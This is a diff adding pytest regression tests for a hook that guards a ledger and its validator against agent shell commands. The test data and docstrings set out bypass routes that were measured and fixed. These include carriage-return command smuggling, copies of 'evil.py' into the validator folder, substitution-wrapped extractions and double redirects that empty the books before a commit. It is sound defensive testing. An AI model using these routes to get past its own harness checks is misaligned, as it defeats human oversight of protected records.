+    """`*` in that position and not `?`, because openings COMBINE.
+
+    `(python …)` is one opening, `((python …))` is two and an indented stage inside a group is a
+    third spelling of the same run; with `?` the first is vouched for and the other two are read as
+    somebody's argument text. The quantifier had no case behind it: measured with `?` in its place,
+    every failure in this file is a case of THIS test — the character test above passes either way,
+    because one opening is all it ever puts there.
+
+    The set is the one the character test measures, so an opening that stops being one cannot
+    survive here as a pair, and the size assertion keeps the loop from quietly measuring nothing.
+    """
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    openings = [char for char in string.printable if _may_open_a_vouched_stage(gate, char, run)]
+    assert len(openings) > 1, "one opening or none: %r" % openings
+    pattern = getattr(gate, name)
+    for first in openings:
+        for second in openings:
+            assert pattern.search(first + second + run), (
+                "%s reads %r in front of its run as prose" % (name, first + second))
+
+
+@pytest.mark.parametrize("target", ("the judge", "the ledger"))
+@pytest.mark.parametrize("where,step,vouched,judge,ledger", _VOUCHED_STAGES)
+def test_a_vouched_run_is_the_start_of_the_stage_it_frees(tmp_path, where, step, vouched, judge,
+                                                          ledger, target):
+    """The same property through the running hook, in the shape it was measured in.
+
+    `test_a_vouched_run_frees_its_own_stage_and_not_its_neighbours` composes the vouched run and
+    the writing stage as SEPARATE stages, so it cannot see a writing stage that IS the vouched one.
+    Here the run stands in that stage's own quoted argument, which is what the old anchor accepted.
+    The second half is the counter-end and is what stops this from being answered by refusing every
+    paren: the subshell spelling of the same run, as its own stage, must stay allowed."""
+    ledger_repo(tmp_path)
+    written = judge if target == "the judge" else ledger
+    prose = "%stee %s '(%s)' < /dev/null && git commit -m x" % (step, written, vouched)
+    assert run_ledger(tmp_path, shell(tmp_path, prose)).returncode == 2, prose
+    opened = "%s(%s) && git commit -m x" % (step, vouched)
+    result = run_ledger(tmp_path, shell(tmp_path, opened))
+    assert result.returncode == 0, "%s was refused:\n%s" % (opened, result.stderr)
+
+
+# WHAT STANDS BEHIND A CARRIAGE RETURN, once the gate reads one as the line break PowerShell reads
+# it as. One write per shell family, because the tool rail is the caller's choice and the line's
+# meaning is not.
+_STAGES_BEHIND_A_CARRIAGE_RETURN = (
+    ("a PowerShell write to the ledger", "Set-Content -Path ledger/2026.csv -Value 'id,doc_date,x'"),
+    ("a POSIX write to the ledger", "tee ledger/2026.csv"),
+    ("a write to the ledger's own judge", "tee scripts/ledger_add.py"),
+)
+
+
+@pytest.mark.parametrize("tool", ("Bash", "PowerShell"))
+@pytest.mark.parametrize("what,write", _STAGES_BEHIND_A_CARRIAGE_RETURN)
+def test_a_carriage_return_ends_a_stage_the_way_powershell_ends_a_statement(
+        tmp_path, what, write, tool):
+    """A stage ends at a carriage return, because one of the two shells this gate is registered on
+    ends a STATEMENT there.
+
+    Measured on both gated shells: `echo one<CR>echo two` prints `oneecho two` under bash — one
+    command — and two lines under PowerShell. With the CR unread, the vouched run in front of it
+    swallowed everything behind it as its own argument text, so the write was never a stage of its
+    own: `python scripts/ledger_add.py --validate ledger/2026.csv<CR>Set-Content -Path
+    ledger/2026.csv …<CR>git commit -am poisoned` was rc 0 from this gate, rc 0 from powershell and
+    left the poisoned books in git HEAD — one gated call, measured end to end on a scaffolded
+    office project outside the repo.
+
+    Asked on both tool rails, because the tool name is the attacker's choice: a refusal that
+    depended on it would be decided by the caller. The counter-end — that reading the CR as a line
+    break does not tear a command off its own flag — is
+    `test_a_carriage_return_does_not_tear_a_command_off_its_own_flag`.
+    """
+    ledger_repo(tmp_path)
+    command = "python scripts/ledger_add.py --validate ledger/2026.csv\r%s\rgit commit -m x" % write
+    payload = dict(shell(tmp_path, command), tool_name=tool)
+    assert run_ledger(tmp_path, payload).returncode == 2, repr(command)
+
+
+def test_a_carriage_return_does_not_tear_a_command_off_its_own_flag(tmp_path):
+    """The other half of that choice: the CR is rewritten INTO the newline rather than added to
+    `_SEGMENT_SPLIT_RX`, so every rule that puts a newline back together keeps seeing it.
+
+    Added to the separator class instead — the one-character fix — `find ledger<CR> -delete` is cut
+    between the verb and the flag that makes it a write, which is the defect
+    `_NEWLINE_BEFORE_FLAG_RX` exists for, reintroduced through a second spelling of the line break.
+    Measured with that spelling in the class: this line goes to rc 0.
+
+    The last case is the false-alarm end: a CRLF-formatted pair of reads must stay allowed, or the
+    CR could be answered by refusing every line that carries one.
+    """
+    ledger_repo(tmp_path)
+    for spelling in ("\r", "\n", "\r\n"):
+        command = "find ledger%s -delete && git commit -m x" % spelling
+        assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, repr(command)
+    allowed = "git status\r\ngit diff && git commit -m x"
+    result = run_ledger(tmp_path, shell(tmp_path, allowed))
+    assert result.returncode == 0, "%r was refused:\n%s" % (allowed, result.stderr)
+
+
+# WHAT A NEIGHBOUR OF A VOUCHED RUN MAY DO WITH A DECOY VALIDATOR, and the two conditions that
+# decide it. `alone` carries no blocked operation and no ledger path; `blocked` adds the commit;
+# `ledger` adds a ledger path to the vouched run as well.
+_DECOY_NEIGHBOURS = (
+    ("writes the decoy", "tee tools/ledger_add.py", 2, 2, 2),
+    ("runs the decoy", "python tools/ledger_add.py", 0, 2, 2),
+    ("only reads the decoy", "cat tools/ledger_add.py", 0, 0, 2),
+)
+
+
+@pytest.mark.parametrize("what,neighbour,alone,blocked,ledger", _DECOY_NEIGHBOURS)
+def test_a_decoy_run_beside_a_vouched_run_is_refused_only_with_a_blocked_op(
+        tmp_path, what, neighbour, alone, blocked, ledger):
+    """The announced price of `H62`, measured instead of described — and the three rows do not
+    share one answer.
+
+    Writing the decoy is refused whatever else the line does: `_writes_protected` is asked of every
+    shell line. RUNNING it is not a write, so the only reader that sees it is the decoy check in
+    `_a_reading_writes_the_ledger`, which `handle_pre_tool_use` asks under `blocked_op` — without a
+    commit/push/report in the same line the run is rc 0. Reading it goes the same way one step
+    later, once a ledger path puts the per-segment decoy check in play at all.
+
+    This is here because the gate's own paragraph said "writes or runs it is refused" for a round,
+    while all three of `… --help | python tools/ledger_add.py` and its sisters were rc 0 — an
+    over-alarming claim in the very paragraph whose job is to say what is NOT bought.
+    """
+    ledger_repo(tmp_path)
+    lines = (("python scripts/ledger_add.py --help | %s" % neighbour, alone),
+             ("python scripts/ledger_add.py --help | %s && git commit -m x" % neighbour, blocked),
+             ("python scripts/ledger_add.py --validate ledger/2026.csv | %s && git commit -m x"
+              % neighbour, ledger))
+    for command, want in lines:
+        result = run_ledger(tmp_path, shell(tmp_path, command))
+        assert result.returncode == want, "%r: rc %d, wanted %d\n%s" % (
+            command, result.returncode, want, result.stderr)
+
+
+# Lines the two shells this kit gates read DIFFERENTLY, which is what makes the monotonicity check
+# below measure anything: each of them must produce two readings, and the check asserts that no
+# single reading is stricter than all of them together.
+_LINES_THE_SHELLS_DISAGREE_ABOUT = (
+    # the POSIX reading turns `c\d` into `cd`, the PowerShell reading does not -- so the step into
+    # the validator's directory exists in exactly one of them
+    "echo start ; c\\d scripts ; python ledger_add.py --validate ledger/2026.csv ; git commit -m x",
+    "echo start ; c\\d scripts ; python ledger_add.py ledger/2026.csv ; git commit -m x",
+    # ...and a decoy path whose separator only one reading keeps
+    "python tools\\ledger_add.py && git commit -m x",
+    "python scripts\\ledger_add.py --validate ledger/2026.csv && git commit -m x",
+)
+
+
+@pytest.mark.parametrize("line", _LINES_THE_SHELLS_DISAGREE_ABOUT)
+def test_a_second_shell_reading_can_only_add_refusals(line):
+    """The monotonicity `_readings_of` claims, measured instead of asserted in prose.
+
+    The previous cut of this test could not fail. It ran over lines with no backslash in them, so
+    every line had exactly ONE reading, and it compared `judge(line)` with `judge(single)` where
+    `judge` resolved its argument again — the assertion was `judge(line) or not judge(line)`. Two
+    mutations that restore real defects (the whole-command exemption, and dropping the second
+    reading) left it green.
+
+    It is now asked of lines the two shells really disagree about — pinned by the `len(readings)`
+    assertion, so the tautology cannot come back silently — and the single reading is judged by the
+    per-reading predicate, which does not resolve anything a second time.
+
+    The property was FALSE when this was built: `_readings_of` joined its readings into one text
+    and `inside_scripts` was computed over that text, so a `cd scripts` present only in the POSIX
+    reading exempted the PowerShell reading as well — where no `cd` had happened and the bare name
+    is the attacker's own program. Measured exit 0 through the registered chain, and PowerShell's
+    `;` runs the rest whatever the failed `cd` did."""
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    readings = gate._readings_of(line)
+    assert len(readings) == 2, (
+        "%r has %d reading(s); with one reading this case asserts nothing" % (line, len(readings)))
+    for whole, per_reading in ((gate._writes_ledger, gate._a_reading_writes_the_ledger),
+                               (gate._writes_protected, gate._a_reading_writes_protected)):
+        for single in readings:
+            assert whole(line) or not per_reading(single), (
+                "a reading on its own refuses %r while all of them together do not: %r"
+                % (line, single))
+
+
+def test_the_resolved_view_keeps_every_reading_the_shells_disagree_about(tmp_path):
+    """...and the construction that makes the check above meaningful: where the two shells read a
+    line differently, BOTH readings reach the judges. Taking only the first one passed every test
+    in this file when the verifier mutated it, which is what a construction nobody measures looks
+    like."""
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    backslash = gate._readings_of("python tools/ledger_add\\.py")
+    assert len(backslash) == 2, backslash
+    assert "ledger_add/.py" in backslash[0] and "ledger_add.py" in backslash[1]
+    assert len(gate._readings_of("python tools/ledger_add.py")) == 1
+
+
+@pytest.mark.parametrize("what,command,expected", [
+    ("a copy into the quoted directory", 'cp evil.py "scripts/" && git commit -m x', 2),
+    ("a recursive copy into it", 'cp -r evil/. "scripts/" && git commit -m x', 2),
+    ("an rsync into it", 'rsync -a evil/ "scripts/" && git commit -m x', 2),
+    ("a move into it", 'mv evil.py "scripts/" && git commit -m x', 2),
+    ("the same without quotes, which always refused", "cp -r evil/. scripts/ && git commit -m x", 2),
+    # ...and a redirect GLUED to the script argument, which the strip used to swallow with it
+    ("a redirect glued to the script argument",
+     "python scripts/ledger_add.py>scripts/ledger_add.py && git commit -m x", 2),
+    ("the same as an append",
+     "python scripts/ledger_add.py>>scripts/ledger_add.py && git commit -m x", 2),
+    # ...and the direction that says the pre-filter did not simply start refusing that folder
+    ("an ordinary read in that folder", 'ruff check "scripts/" && git commit -m x', 0),
+    ("the remedy, whose script path the pre-filter still strips",
+     'python "scripts/ledger_add.py" --validate ledger/2026.csv && git commit -m x', 0),
+    ("the remedy with its output redirected somewhere harmless",
+     "python scripts/ledger_add.py --validate ledger/2026.csv>/tmp/out && git commit -m x", 0),
+])
+def test_the_prefilter_sees_everything_the_decision_sees(tmp_path, what, command, expected):
+    """A cheap pre-filter in front of an expensive decision must not be NARROWER than it.
+
+    The judge-write branch asked `_PROTECTED_RX`/`_PROTECTED_DIR_RX` of the RAW command and only
+    then called `_writes_protected`, which resolves quoting first. A quote mark between a copy verb
+    and its destination is invisible to the raw view — the copy branch of `_PROTECTED_DIR_RX` has
+    no place for one, while the flag branch does — so `cp -r evil/. "scripts/" && git commit`
+    overwrote the validator's directory and committed: rc 0 at HEAD, before this round and after
+    it, with `_writes_protected` answering True the whole time. Nothing was gained by the narrower
+    view; the refusal was simply never reached.
+
+    The second way to be narrower is to REMOVE too much: the pre-filter strips the script argument
+    of an interpreter run, and `\\S+` ran that token straight through a glued `>` — so `python
+    scripts/ledger_add.py>scripts/ledger_add.py` lost its redirect target along with the run and
+    left no protected path in the view at all. rc 0 from this gate for a line that truncates the
+    judge, while the spaced spelling of the same line was rc 2.
+
+    Both directions are here, because widening a pre-filter is how the previous widening of this
+    gate bought false refusals."""
+    ledger_repo(tmp_path)
+    result = run_ledger(tmp_path, shell(tmp_path, command))
+    assert result.returncode == expected, "%s:\n%s" % (what, result.stderr)
+
+
+def test_the_remedy_this_gate_prints_is_one_it_accepts(tmp_path):
+    """`BUG-0064`, in the direction the refusal text itself creates: the gate names a validator
+    path and a ledger path in its own message, and the operator types that line back.
+
+    `VALIDATOR` was built with `os.path.join`, so on Windows the message read `python
+    scripts\\ledger_add.py --validate …` while the findings list above it named `ledger/2026.csv`.
+    That mixed line was REFUSED — one of the two shell readings consumes the backslash, the
+    canonical path is gone in that reading, and a ledger path beside an unvouched interpreter run
+    is a write. Measured rc 2 while both uniform spellings were rc 0.
+
+    Both paths are read out of the message the gate actually printed rather than written here a
+    second time: a hand copy of a message is a claim about the message, and the message is the
+    thing under test."""
+    ledger = ledger_repo(tmp_path, rows=BAD_ROW)
+    refusal = run_ledger(tmp_path, shell(tmp_path, "git commit -m x"))
+    assert refusal.returncode == 2, refusal.stderr
+    validator = re.search(r"`python (\S+) --validate", refusal.stderr)
+    named_ledger = re.search(r"^\s{2}(\S+\.csv):", refusal.stderr, re.MULTILINE)
+    assert validator and named_ledger, (
+        "the refusal no longer prints a remedy command and a findings list this test can read "
+        "back; without both, it measures nothing:\n%s" % refusal.stderr)
+    write(str(ledger), LEDGER_COLS + GOOD_ROW)
+    command = "python %s --validate %s && git commit -m x" % (validator.group(1),
+                                                              named_ledger.group(1))
+    result = run_ledger(tmp_path, shell(tmp_path, command))
+    assert result.returncode == 0, "the line this gate printed is one it refuses: %s\n%s" % (
+        command, result.stderr)
+
+
+def test_the_remedy_typed_from_inside_the_validators_directory_still_works(tmp_path):
+    """The direction the exemption exists for, and the one an over-narrow rule would take away:
+    the bare name after the step is the canonical validator, and running it is how an agent under
+    a ledger block gets out. This line was refused before this round for an unrelated reason — the
+    decoy check stood in front of the exemption — so the remedy the refusal text advertises could
+    not be typed."""
+    ledger_repo(tmp_path)
+    command = "cd scripts && python ledger_add.py --validate ../ledger/2026.csv && git commit -m x"
+    result = run_ledger(tmp_path, shell(tmp_path, command))
+    assert result.returncode == 0, result.stderr
+
+
+# A substitution's OPENING is a segment separator here; its CLOSING paren stays glued to the word
+# in front of it. Every shape below ends the destination word with a paren, which is why they are
+# one table: the property is where the word ends, not which of the three spellings opened it.
+_A_PAREN_ENDS_THE_TARGET_WORD = (
+    ("a command substitution around an extraction into the validator's folder",
+     "echo \"$(tar -xf evil.tar -C scripts/)\" && git commit -m x"),
+    ("a command substitution around a copy into the validator's folder",
+     "echo \"$(cp evil.py scripts/)\" && git commit -m x"),
+    ("the backtick spelling of the same substitution",
+     "echo \"`tar -xf evil.tar -C scripts/`\" && git commit -m x"),
+    ("a bare subshell around the copy",
+     "(cp evil.py scripts/) && git commit -m x"),
+    ("a substitution in the vouched validator's own note",
+     "python scripts/ledger_add.py --validate ledger/2026.csv --note \"$(cp evil.py scripts/)\" "
+     "&& git commit -m x"),
+)
+
+
+@pytest.mark.parametrize("what,command", _A_PAREN_ENDS_THE_TARGET_WORD)
+def test_a_closing_paren_ends_a_word_for_this_reader_too(tmp_path, what, command):
+    """BUG-0065. `_SUBSTITUTION_OPEN_RX` turns the OPENING of a substitution into a separator, so
+    the write inside it becomes a segment of its own — but the closing paren stayed attached to the
+    destination, and both closers of `_PROTECTED_DIR_RX` accepted only whitespace, a quote, `;`,
+    `|`, `&` or end of text. The word this reader saw was `scripts/)`, which is not the directory,
+    so the extraction ran and the commit went through: exit 0 through the registered chain, at HEAD
+    and after the first TSK-0083 rework. The backtick spelling needed the same character for the
+    same reason and was measured missing from the first cut of `_WORD_END`."""
+    ledger_repo(tmp_path)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2, what
+
+
+@pytest.mark.parametrize("what,command", [
+    ("parentheses in the entry point's summary",
+     "python scripts/harness.py evidence --summary \"net 1,19 (ok) booked via "
+     "scripts/ledger_add.py\" && git commit -m x"),
+    ("parentheses in a commit message",
+     "git commit -m 'total 1,19 (ok) for ledger/2026.csv'"),
+    ("parentheses in the validator's own note",
+     "python scripts/ledger_add.py --validate ledger/2026.csv --note \"1,19 (ok)\" "
+     "&& git commit -m x"),
+])
+def test_parentheses_in_prose_are_still_prose(tmp_path, what, command):
+    """The counter-direction BUG-0065 asks for by name: a paren ends a WORD, it does not open a
+    command. Ending the word is what the fix does; the alternative considered and dropped was to
+    make a closing paren a SEGMENT boundary, which would have cut ordinary money prose (`1,19
+    (ok)`) into command fragments."""
+    ledger_repo(tmp_path)
+    result = run_ledger(tmp_path, shell(tmp_path, command))
+    assert result.returncode == 0, "%s was refused:\n%s" % (what, result.stderr)
+
+
+@pytest.mark.parametrize("what,command,expected", [
+    ("the second target empties the ledger, then commit",
+     "cat ledger/2026.csv > /tmp/a > ledger/2026.csv && git commit -m x", 2),
+    ("the second target empties the validator",
+     "cat scripts/ledger_add.py > /tmp/a > scripts/ledger_add.py", 2),
+    ("the second target empties the gate's own state file",
+     "cat README.md > /tmp/a > .claude/ledger_state.json", 2),
+    ("the third target is the harmful one",
+     "cat ledger/2026.csv > /tmp/a > /tmp/b > ledger/2026.csv && git commit -m x", 2),
+    # ...and the direction that says the reader did not simply start refusing every redirect
+    ("every target of the segment points away",
+     "cat ledger/2026.csv > /tmp/a > /tmp/b && git commit -m x", 0),
+    ("one harmless target",
+     "cat ledger/2026.csv > /tmp/backup.csv && git commit -m x", 0),
+])
+def test_every_redirect_target_of_a_segment_is_read(tmp_path, what, command, expected):
+    """A shell opens and truncates EVERY redirection of a command, so a segment carrying two of
+    them writes two files. Both readers asked `_REDIRECT_INTO_RX.search(...)` and stopped at the
+    first: `cat ledger/2026.csv > /tmp/a > ledger/2026.csv && git commit` emptied the books and
+    committed them, exit 0, with the harmless target standing in front."""
+    ledger_repo(tmp_path)
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == expected, what
+
+
+@pytest.mark.parametrize("segment,targets", [
+    ("cat a > /tmp/x > ledger/2026.csv", ["/tmp/x", "ledger/2026.csv"]),
+    ("cat a >> ledger/2026.csv", ["ledger/2026.csv"]),
+    ("cat a > \"ledger/2026.csv\"", ["ledger/2026.csv"]),
+    # the CLOBBER OVERRIDE: `>|` redirects exactly like `>`, and the reader did not know it
+    ("cat a >| ledger/2026.csv", ["ledger/2026.csv"]),
+    ("cat a > /tmp/x >| scripts/ledger_add.py", ["/tmp/x", "scripts/ledger_add.py"]),
+    # ...and a descriptor duplication, which writes no file and must NOT yield a target
+    ("python scripts/harness.py doctor 2>&1", []),
+    ("cat a", []),
+])
+def test_the_redirect_reader_names_every_target_and_only_targets(segment, targets):
+    """`_redirect_targets` asked at the function, because the END-TO-END verdict cannot measure it
+    for `>|`: the `|` splits the stage and the second stage's verb is not a reading one, so those
+    lines are refused either way. A case that passes with and without the fix is not a measurement,
+    so the property is pinned where it can fail — the docstring of `_redirect_targets` says EVERY,
+    and this is what makes that word true rather than hopeful."""
+    gate = load_hook_module("gate_ledger_valid", OFFICE_HOOKS)
+    assert gate._redirect_targets(segment) == targets, segment
+
+
+def test_the_module_form_of_the_entry_point_is_not_the_entry_point(tmp_path):
+    """`python -m scripts.harness` is an inline payload naming a MODULE, not the script argument
+    the exemption is anchored to — and `-m` is exactly the letter BUG-0063's tail scan used to
+    catch by accident, from the wrong side of the script name."""
+    ledger_repo(tmp_path)
+    command = ("python -m scripts.harness submit-result --summary 'booked via ledger_add.py' "
+               "&& git commit -m x")
+    assert run_ledger(tmp_path, shell(tmp_path, command)).returncode == 2
 
 
 def test_a_harmless_copy_out_does_not_disarm_the_cd_form(tmp_path):
